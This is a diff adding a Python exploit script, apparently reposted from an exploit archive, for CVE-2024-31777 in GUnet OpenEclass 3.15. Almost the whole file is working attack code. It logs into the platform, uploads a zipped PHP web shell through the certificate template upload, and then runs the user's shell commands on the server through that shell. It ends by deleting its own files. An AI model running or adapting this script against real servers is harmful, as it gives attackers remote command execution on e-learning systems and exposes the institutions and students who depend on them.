@@ -1,0 +1,138 @@
+id: 39540
+date: 04/11/2024
+title: GUnet OpenEclass E-learning 3.15 File Upload / Command Execution Exploit
+author: Georgios Tsimpidas
+cves: CVE-2024-31777
+
+import requests
+import argparse
+import zipfile
+import os
+import sys
+
+RED = '\033[91m'
+GREEN = '\033[92m'
+YELLOW = '\033[93m'
+RESET = '\033[0m'
+ORANGE = '\033[38;5;208m'
+
+MALICIOUS_PAYLOAD = """\
+<?php
+
+if(isset($_REQUEST['cmd'])){
+        $cmd = ($_REQUEST['cmd']);
+        system($cmd);
+        die;
+}
+
+?>
+"""
+
+def banner():
+    print(f'''{RED}
+{YELLOW}
+ ============================ Author: Frey ============================
+{RESET}''')
+
+def execute_command(openeclass, filename):
+    while True:
+        # Prompt for user input with "eclass"
+        cmd = input(f"{RED}[{YELLOW}eClass{RED}]~# {RESET}")
+
+        # Check if the command is 'quit', then break the loop
+        if cmd.lower() == "quit":
+            print(f"{ORANGE}\nExiting...{RESET}")
+            clean_server(openeclass)
+            sys.exit()
+
+        # Construct the URL with the user-provided command
+        url = f"{openeclass}/courses/user_progress_data/cert_templates/{filename}?cmd={cmd}"
+
+        # Execute the GET request
+        try:
+            response = requests.get(url)
+
+            # Check if the request was successful
+            if response.status_code == 200:
+                # Print the response text
+                print(f"{GREEN}{response.text}{RESET}")
+
+        except requests.exceptions.RequestException as e:
+            # Print any error that occurs during the request
+            print(f"{RED}An error occurred: {e}{RESET}")
+
+def upload_web_shell(openeclass, username, password):
+    login_url = f'{openeclass}/?login_page=1'
+    login_page_url = f'{openeclass}/main/login_form.php?next=%2Fmain%2Fportfolio.php'
+
+    # Login credentials
+    payload = {
+        'next': '/main/portfolio.php',
+        'uname': f'{username}',
+        'pass': f'{password}',
+        'submit': 'Enter'
+    }
+
+    headers = {
+        'Referer': login_page_url,
+    }
+
+    # Use a session to ensure cookies are handled correctly
+    with requests.Session() as session:
+        # (Optional) Initially visit the login page if needed to get a fresh session cookie or any other required tokens
+        session.get(login_page_url)
+
+        # Post the login credentials
+        response = session.post(login_url, headers=headers, data=payload)
+
+        # Create a zip file containing the malicious payload
+        zip_file_path = 'malicious_payload.zip'
+        with zipfile.ZipFile(zip_file_path, 'w') as zipf:
+            zipf.writestr('evil.php', MALICIOUS_PAYLOAD.encode())
+
+        # Upload the zip file
+        url = f'{openeclass}/modules/admin/certbadge.php?action=add_cert'
+        files = {
+            'filename': ('evil.zip', open(zip_file_path, 'rb'), 'application/zip'),
+            'certhtmlfile': (None, ''),
+            'orientation': (None, 'L'),
+            'description': (None, ''),
+            'cert_id': (None, ''),
+            'submit_cert_template': (None, '')
+        }
+        response = session.post(url, files=files)
+
+        # Clean up the zip file
+        os.remove(zip_file_path)
+
+        # Check if the upload was successful
+        if response.status_code == 200:
+            print(f"{GREEN}Payload uploaded successfully!{RESET}")
+            return True
+        else:
+            print(f"{RED}Failed to upload payload. Exiting...{RESET}")
+            return False
+
+def clean_server(openeclass):
+    print(f"{ORANGE}Cleaning server...{RESET}")
+    # Remove the uploaded files
+    requests.get(f"{openeclass}/courses/user_progress_data/cert_templates/evil.php?cmd=rm%20evil.zip")
+    requests.get(f"{openeclass}/courses/user_progress_data/cert_templates/evil.php?cmd=rm%20evil.php")
+    print(f"{GREEN}Server cleaned successfully!{RESET}")
+
+def main():
+    parser = argparse.ArgumentParser(description="Open eClass – CVE-CVE-2024-31777: Unrestricted File Upload Leads to Remote Code Execution")
+    parser.add_argument('-u', '--username', required=True, help="Username for login")
+    parser.add_argument('-p', '--password', required=True, help="Password for login")
+    parser.add_argument('-e', '--eclass', required=True, help="Base URL of the Open eClass")
+    args = parser.parse_args()
+
+    banner()
+    # Running the main login and execute command function
+    if upload_web_shell(args.eclass, args.username, args.password):
+        execute_command(args.eclass, 'evil.php')
+
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-04-14]  #
